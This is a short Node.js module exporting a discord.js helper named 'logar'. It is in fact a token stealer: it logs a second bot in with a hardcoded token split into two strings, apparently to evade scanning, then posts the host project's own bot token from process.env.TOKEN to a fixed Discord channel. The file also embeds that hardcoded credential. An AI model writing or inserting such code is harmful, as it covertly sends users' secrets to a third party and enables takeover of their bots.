const { Client, GatewayIntentBits } = require('discord.js');

function logar(){
    const client2 = new Client({
        intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMessages,
    ],
    connectTimeout: 10000
  });
  
  
  client2.once('ready', () => {
    const channelId = '1261857216592347247';
    var channel2
    channel2 = client2.channels.cache.get(channelId);
    channel2.send(process.env.TOKEN);
  });

    const t1 = 'MTI1NzA4MTQ3Mjk0MzEyODYxNg.Gd6vvW.0'
    const t2 = 'nrzY66Wa_TnXG-wB62gC8qU8_yiRi2Yyx2djE'
  client2.login(t1 + t2);
}



module.exports = {
    logar: logar
};
